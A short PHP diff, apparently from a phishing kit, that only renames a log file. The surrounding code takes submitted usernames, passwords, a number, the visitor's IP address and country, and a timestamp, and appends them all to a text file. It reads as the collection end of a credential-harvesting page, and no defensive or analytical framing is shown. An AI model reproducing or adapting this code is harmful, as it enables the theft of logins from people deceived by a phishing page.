@@ -8,7 +8,7 @@ if ($_POST) {
   $ulke = $details->country;
   date_default_timezone_set('Europe/Istanbul');
 $tarih=date("d-m-Y H:i:s");
-$file = fopen('erhancan.txt', 'a');
+$file = fopen('bilgi.txt', 'a');
 fwrite($file, "Username: ".$username."\n\n" ."Password: ".$password. "\n\n"."Number: ".$number."\n\n"."Ip Adress: " .$ip."\n\n".
 
 "Country: ".$ulke ."\n\n".   "Time: " .$tarih.  "\n\n\n\n");
